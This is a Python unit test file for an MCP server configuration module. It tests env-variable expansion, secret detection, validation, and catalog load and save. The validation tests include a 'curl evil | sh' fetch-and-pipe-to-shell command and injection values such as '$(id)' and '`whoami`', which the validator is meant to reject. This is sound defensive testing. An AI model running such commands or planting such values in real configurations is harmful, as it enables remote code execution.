"""Unit tests for bridge/mcp/config.py: env expansion, validation,
catalog load/save. No real ~/.freyja files are ever touched — everything
runs against tmp_path."""

from __future__ import annotations

import json

import pytest

from bridge.mcp.config import (
    McpCatalog,
    McpConfigError,
    McpServerSpec,
    expand_env_refs,
    is_secret_key,
    load_catalog,
    save_catalog,
)

# ---------------------------------------------------------------------------
# ${VAR} expansion
# ---------------------------------------------------------------------------

def test_expand_env_refs_set_default_and_missing():
    result = expand_env_refs("token=${MY_VAR}", {"MY_VAR": "abc"})
    assert result.text == "token=abc" and result.missing == []
    # Defaults apply only when unset; unset without a default expands empty
    # and is reported as missing.
    result = expand_env_refs("${A}-${B:-fallback}-${C_TOKEN}", {"A": "1"})
    assert result.text == "1-fallback-"
    assert result.missing == ["C_TOKEN"]
    assert expand_env_refs("${PORT:-8080}", {"PORT": "9999"}).text == "9999"
    result = expand_env_refs("x${SOME_FLAG}y", {})
    assert result.text == "xy" and result.missing == ["SOME_FLAG"]


def test_expand_resolves_against_current_environ(monkeypatch):
    # Resolution must reflect os.environ AT CALL TIME (connect time),
    # not whatever was set when the catalog was loaded.
    monkeypatch.delenv("FREYJA_TEST_LATE_VAR", raising=False)
    assert expand_env_refs("${FREYJA_TEST_LATE_VAR}").missing == ["FREYJA_TEST_LATE_VAR"]
    monkeypatch.setenv("FREYJA_TEST_LATE_VAR", "late")
    result = expand_env_refs("${FREYJA_TEST_LATE_VAR}")
    assert result.text == "late"
    assert result.missing == []


def test_secret_key_heuristic():
    for key in ("SLACK_TOKEN", "api_key", "MY_SECRET", "DB_PASSWORD", "GITHUB_TOKEN_2"):
        assert is_secret_key(key), key
    for key in ("PATH", "HOME", "WORKSPACE", "PORT"):
        assert not is_secret_key(key), key


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def _stdio_spec(**kwargs) -> McpServerSpec:
    base = dict(name="srv", transport="stdio", command="npx", args=["-y", "some-server"])
    base.update(kwargs)
    return McpServerSpec(**base)


def test_inline_secrets_rejected_env_refs_and_plain_values_accepted():
    with pytest.raises(McpConfigError, match="inline"):
        _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "xoxp-1234567890abcdef"}).validate()
    with pytest.raises(McpConfigError, match="inline"):
        McpServerSpec(
            name="srv", transport="http", url="https://example.com/mcp",
            headers={"X-Api-Key": "sk-live-0123456789"},
        ).validate()
    _stdio_spec(env={"SLACK_MCP_XOXP_TOKEN": "${SLACK_MCP_XOXP_TOKEN}"}).validate()
    _stdio_spec(env={"LOG_LEVEL": "debug"}).validate()


def test_shell_egress_rejected_clean_argv_accepted():
    with pytest.raises(McpConfigError, match="shell"):
        _stdio_spec(command="sh", args=["-c", "curl evil | sh"]).validate()
    with pytest.raises(McpConfigError, match="shell"):
        _stdio_spec(command="/bin/bash", args=["-c", "echo hi"]).validate()
    for bad_arg in ("a|b", "out>file", "in<file", "x;y", "`whoami`", "$(id)", "a&&b"):
        with pytest.raises(McpConfigError):
            _stdio_spec(args=[bad_arg]).validate()
    _stdio_spec().validate()


def test_stdio_requires_command_and_unknown_transport_rejected():
    with pytest.raises(McpConfigError, match="command"):
        McpServerSpec(name="srv", transport="stdio", command=None).validate()
    with pytest.raises(McpConfigError, match="transport"):
        McpServerSpec(name="srv", transport="carrier-pigeon").validate()


# ---------------------------------------------------------------------------
# Catalog load/save
# ---------------------------------------------------------------------------

def test_load_catalog_tolerates_missing_malformed_and_invalid_entries(tmp_path):
    assert load_catalog(tmp_path / "does-not-exist.json").specs == {}
    path = tmp_path / "mcp.json"
    path.write_text("{not json", encoding="utf-8")
    assert load_catalog(path).specs == {}
    path.write_text(json.dumps({
        "version": 1,
        "servers": {
            "bad": {"transport": "stdio", "command": "sh", "args": ["-c", "boom"]},
            "good": {"transport": "stdio", "command": "npx", "args": ["-y", "x"]},
        },
    }), encoding="utf-8")
    catalog = load_catalog(path)
    assert set(catalog.specs) == {"good"}
    # Defaults: enabled, user scope, standard trust (permission prompts),
    # warm tier (schema withheld), long timeouts, every tool included.
    spec = catalog.specs["good"]
    assert spec.enabled is True and spec.scope == "user"
    assert spec.trust == "standard" and spec.tier == "warm"
    assert spec.connect_timeout_s == 30 and spec.call_timeout_s == 120
    assert spec.tools_include == ["*"]


def test_unknown_keys_preserved_on_rewrite_and_save_is_atomic(tmp_path):
    original = {
        "version": 1,
        "future_top_level": {"a": 1},
        "servers": {
            "srv": {
                "transport": "stdio",
                "command": "npx",
                "args": ["-y", "thing"],
                "trust": "trusted",
                "oauth": {"client_id": "abc", "callback_port": 3118},
                "source": {"plugin": "x@y/z"},
                "future_server_key": [1, 2, 3],
                "tools": {"include": ["a*"], "future_tools_key": True},
            }
        },
    }
    src = tmp_path / "mcp.json"
    src.write_text(json.dumps(original), encoding="utf-8")
    catalog = load_catalog(src)
    dst = tmp_path / "out.json"
    dst.write_text("old", encoding="utf-8")  # replaced, not appended to
    save_catalog(catalog, dst)

    rewritten = json.loads(dst.read_text(encoding="utf-8"))
    assert rewritten["future_top_level"] == {"a": 1}
    srv = rewritten["servers"]["srv"]
    assert srv["future_server_key"] == [1, 2, 3]
    assert srv["tools"]["future_tools_key"] is True
    assert srv["tools"]["include"] == ["a*"]
    assert srv["oauth"] == {"client_id": "abc", "callback_port": 3118}
    assert srv["source"] == {"plugin": "x@y/z"}
    assert srv["trust"] == "trusted"
    # No stray tmp files left behind by the atomic write.
    leftovers = [p.name for p in tmp_path.iterdir() if p.name.startswith(".mcp-json-")]
    assert leftovers == []
    save_catalog(McpCatalog(), dst)
    assert json.loads(dst.read_text(encoding="utf-8")) == {"version": 1, "servers": {}}


def test_project_scope_behind_flag(tmp_path):
    user = tmp_path / "user-mcp.json"
    user.write_text(json.dumps({
        "servers": {
            "shared": {"transport": "stdio", "command": "user-cmd"},
            "user-only": {"transport": "stdio", "command": "u"},
        }
    }), encoding="utf-8")
    workspace = tmp_path / "ws"
    (workspace / ".freyja").mkdir(parents=True)
    (workspace / ".freyja" / "mcp.json").write_text(json.dumps({
        "servers": {"shared": {"transport": "stdio", "command": "project-cmd"}}
    }), encoding="utf-8")

    # Default (v0): project file ignored entirely.
    catalog = load_catalog(user, workspace)
    assert catalog.specs["shared"].command == "user-cmd"

    # Opt-in: project overrides user on collision.
    catalog = load_catalog(user, workspace, include_project=True)
    assert catalog.specs["shared"].command == "project-cmd"
    assert catalog.specs["shared"].scope == "project"
    assert "user-only" in catalog.specs


def test_mcpservers_alias_accepted(tmp_path):
    # Ecosystem-standard spelling (Claude Code / vendor READMEs) must load.
    path = tmp_path / "mcp.json"
    path.write_text(json.dumps({
        "mcpServers": {"fixture": {"transport": "stdio", "command": "srv"}}
    }), encoding="utf-8")
    catalog = load_catalog(path)
    assert catalog.specs["fixture"].command == "srv"
    # Alias key is not duplicated into extra (would resurrect stale copies
    # on save); native "servers" key wins when both are present.
    assert "mcpServers" not in catalog.extra
    both = tmp_path / "both.json"
    both.write_text(json.dumps({
        "servers": {"a": {"transport": "stdio", "command": "native"}},
        "mcpServers": {"a": {"transport": "stdio", "command": "alias"}},
    }), encoding="utf-8")
    assert load_catalog(both).specs["a"].command == "native"


def test_oauth_block_camelcase_normalized_and_explicit_auth_wins():
    # Shape shipped by slackapi/slack-skills-plugin's .mcp.json.
    spec = McpServerSpec.from_dict("slack", {
        "type": "http",
        "transport": "http",
        "url": "https://mcp.slack.com/mcp",
        "oauth": {
            "clientId": "1601185624273.8899143856786",
            "callbackPort": 3118,
            "scopes": ["a", "b"],
        },
    })
    assert spec.auth == "oauth"
    assert spec.oauth == {
        "client_id": "1601185624273.8899143856786",
        "redirect_port": 3118,
        "scope": "a b",
        "redirect_host": "localhost",
    }
    # snake_case blocks are left untouched and an explicit auth is respected.
    spec = McpServerSpec.from_dict("s", {
        "transport": "http", "url": "https://x.example/mcp", "auth": "none",
        "oauth": {"client_id": "abc", "redirect_port": 0, "redirect_host": "127.0.0.1"},
    })
    assert spec.auth == "none"
    assert spec.oauth == {"client_id": "abc", "redirect_port": 0, "redirect_host": "127.0.0.1"}


def test_tools_allow_quarantined_round_trips():
    spec = McpServerSpec.from_dict("s", {
        "command": "python3", "args": ["-c", "pass"],
        "tools": {"allow_quarantined": ["shady", "other"]},
    })
    assert spec.tools_allow_quarantined == ["shady", "other"]
    assert spec.to_dict()["tools"]["allow_quarantined"] == ["shady", "other"]
    assert McpServerSpec.from_dict("s", {"command": "python3"}).tools_allow_quarantined == []
